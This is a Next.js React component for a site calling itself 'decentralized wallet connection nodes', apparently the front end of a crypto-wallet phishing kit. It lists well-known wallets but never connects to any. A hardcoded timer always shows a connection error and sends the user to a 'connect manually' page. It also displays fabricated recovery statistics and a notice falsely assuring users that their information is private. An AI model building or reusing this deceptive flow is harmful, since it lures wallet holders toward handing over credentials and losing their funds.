"use client";
import React, { useState } from "react";
import Image from "next/image";
import Link from "next/link";
import CountUp from "react-countup";
import Modal from "./Modal";
import { PiWarningCircleLight } from "react-icons/pi";

import other from "@/public/images/other.png";
import CoinNew from "../public/images/blockchain3.png";
import wallet from "@/public/image/walletconnect.png";
import metamask from "@/public/image/metamask.png";
import coinbase from "@/public/image/coinbase.png";
import phantom from "@/public/image/phantom.png";
import trust from "@/public/image/trust_wallet.png";
import safepal from "@/public/image/safepal.jpeg";
import ledger from "@/public/image/ledger.webp";
import keplr from "@/public/image/keplr.png";

const Hero = () => {
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showConnectManuallyModal, setShowConnectManuallyModal] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'idle' | 'connecting' | 'error'>('idle');
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);

  const toggleWalletModal = () => {
    setShowWalletModal(!showWalletModal);
    setConnectionStatus('idle');
    setSelectedWallet(null);
  };

  const handleCloseWalletModal = () => {
    setShowWalletModal(false);
    setConnectionStatus('idle');
    setSelectedWallet(null);
  };

  const handleWalletClick = (walletName: string) => {
    setShowWalletModal(false); // Close Wallet Modal
    setShowTermsModal(true); // Open Terms Modal
    setSelectedWallet(walletName);
  };

  const handleConnectClick = () => {
    setShowWalletModal(true);
  };

  const handleAcceptTerms = () => {
    setShowTermsModal(false);
    setConnectionStatus('connecting'); // Set status to connecting
    setShowConnectManuallyModal(true);

    // After 3 seconds, show the error message
    setTimeout(() => {
        setConnectionStatus('error');
    }, 3000);
};

  const walletData = [
    { name: "WalletConnect", image: wallet },
    { name: "Metamask", image: metamask },
    { name: "Coinbase", image: coinbase },
    { name: "Phantom", image: phantom },
    { name: "Trust Wallet", image: trust },
    { name: "Keplr Wallet", image: keplr },
    { name: "Safepal", image: safepal },
    { name: "Ledger", image: ledger },
    { name: "Other wallets", image: other },
  ];

  return (
    <div className="flex flex-col-reverse lg:flex-row mt-16 text-white relative" id="Hero">
      <div className="flex px-4 lg:w-2/5 md:pl-16 md:pt-3">
        <div className="md:mt-56 lg:mt-0 lg:absolute left-14 top-20 w-full lg:w-1/2">
          <h1 className="font-normal text-3xl leading-8 md:text-5xl md:leading-[57.6px]">
            Decentralized{" "}
            <span className="bg-clip-text text-transparent bg-gradient-to-r from-[#20A4F3] to-[#59F8E8]">
              wallet connection
            </span>{" "}
            nodes
          </h1>
          <p className="text-sm leading-7 max-w-lg lg:w-3/5 py-5">
            A tool that enables wallets and apps to securely connect and interact, essential for ensuring the security and integrity of digital assets. Performs a comprehensive analysis of the wallet's structure and contents.
          </p>
          <div className="flex md:w-1/2 gap-2 lg:w-4/5 xl:w-1/2 max-w-lg md:gap-5 items-center">
            <button
              onClick={handleConnectClick}
              className="text-[#0F1212] cursor-pointer px-[4.5px] py-[6px] md:px-1.5 md:py-1.5 bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] w-full font-semibold text-base rounded-md"
            >
              Connect
            </button>
            <button
              className="px-1.5 py-1.5 w-full font-semibold text-base text-[#bbd3d3] bg-[#59F8E8]/20"
              id="WhitePaper"
            >
              Whitepaper
            </button>
          </div>
          <div className="w-full flex items-center justify-between md:w-4/5 lg:w-full xl:w-4/5 mt-8 md:mt-16 text-2xl md:text-4xl leading-10">
            <div>
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-[#20A4F3] to-[#59F8E8]">
                <CountUp end={250} duration={2} />+
              </span>
              <h1 className="text-xs md:text-base">Wallets Revoked</h1>
            </div>
            <div className="mx-3">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-[#20A4F3] to-[#59F8E8]">
                $<CountUp end={10} duration={3} />M+
              </span>
              <h1 className="text-xs md:text-base">Recovered</h1>
            </div>
            <div>
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-[#20A4F3] to-[#59F8E8]">
                <CountUp end={2800} duration={3} />+
              </span>
              <h1 className="text-xs md:text-base">Users</h1>
            </div>
          </div>
        </div>
      </div>

      <div className="flex-1 md:pl-16 mx-auto -mt-20 lg:w-full lg:mt-0 p-[1px] lg:min-w-[574.14px] rounded-lg">
        <div className="css-gradient rounded-lg">
          <div className="sm:w-[600px] sm:h-[500px] w-full h-full">
            <Image
              className="h-full w-full object-cover bg-blend-lighten animate-custom-bounce"
              src={CoinNew}
              alt="social-icon"
            />
          </div>
        </div>
      </div>

      {/* Wallet Modal */}
      <Modal isVisible={showWalletModal} onClose={handleCloseWalletModal}>
        <div className="modal left-0 top-0 flex justify-center items-center">
          <div className="rounded-3xl shadow-lg modal-content w-[350px]">
            <div className="border-b py-4 px-2 modal-header">
              <h5 className="modal-title">Connect Wallet</h5>
            </div>
            <div className="p-3 modal-body">
              {connectionStatus === 'idle' && (
                <>
                  <p>Connect with one of our available wallet providers.</p>
                  <div className="modal-wallets">
                    {walletData.map((wallet, index) => (
                      <Link href="#" key={index} onClick={() => handleWalletClick(wallet.name)}>
                        <Image src={wallet.image} width={30} height={35} alt={wallet.name} />
                        {wallet.name}
                      </Link>
                    ))}
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </Modal>

      {/* Terms Modal */}
      <Modal isVisible={showTermsModal} onClose={() => setShowTermsModal(false)}>
        <div className="modal left-0 top-0 flex justify-center items-center z-[90]">
          <div className="rounded-3xl shadow-lg w-[350px] alert-body">
            <div className="p-3 modal-body flex justify-center items-center flex-col">
              <PiWarningCircleLight className="text-center justify-center items-center h-16 w-16 text-yellow-600" />
              <h1 className="py-4 text-black font-semibold">Notice!!!</h1>
              <p className="text-black text-sm font-light">Any information used on the website is not accessible by anyone except the user, no one can have access to any information put/used for validity, make sure you logout your wallet when you are done.</p>
              <span className="py-4 text-black font-medium text-sm">Terms & Policy Apply</span>
              <button
                onClick={handleAcceptTerms}
                className="text-white cursor-pointer px-[4.5px] py-[6px] md:px-1.5 md:py-1.5 bg-blue-500 font-semibold text-base rounded-md"
              >
                Accept Terms
              </button>
            </div>
          </div>
        </div>
      </Modal>

      {/* Connect Manually Modal */}
      <Modal isVisible={showConnectManuallyModal} onClose={() => setShowConnectManuallyModal(false)}>
    <div className="modal left-0 top-0 flex justify-center items-center">
    <div className="rounded-3xl shadow-lg modal-content w-[350px] h-[180px]">
            <div className="p-3 modal-body">
                {connectionStatus === 'connecting' && (
                    <div className="justify-center items-center gap-5 flex flex-col">
                        {selectedWallet && (
                            <>
                                <Image
                                    src={walletData.find(wallet => wallet.name === selectedWallet)?.image || ''}
                                    width={40}
                                    height={40}
                                    alt={selectedWallet}
                                    className="ml-2"
                                />
                                <p>Connecting to {selectedWallet}...</p>
                            </>
                        )}
                    </div>
                )}
                {connectionStatus === 'error' && (
                    <div className="justify-center items-center gap-5 flex flex-col">
                        {selectedWallet && (
                            <>
                                <Image
                                    src={walletData.find(wallet => wallet.name === selectedWallet)?.image || ''}
                                    width={40}
                                    height={40}
                                    alt={selectedWallet}
                                    className="ml-2"
                                />
                                <p>Error connecting, connect manually</p>
                                <button className="text-[#0F1212] cursor-pointer px-[4.5px] py-[6px] md:px-1.5 md:py-1.5 bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] w-full font-semibold text-base rounded-md">
                                    <Link href="/connect">
                                        Connect manually
                                    </Link>
                                </button>
                            </>
                        )}
                    </div>
                )}
            </div>
        </div>
    </div>
</Modal>
    </div>
  );
};

export default Hero;
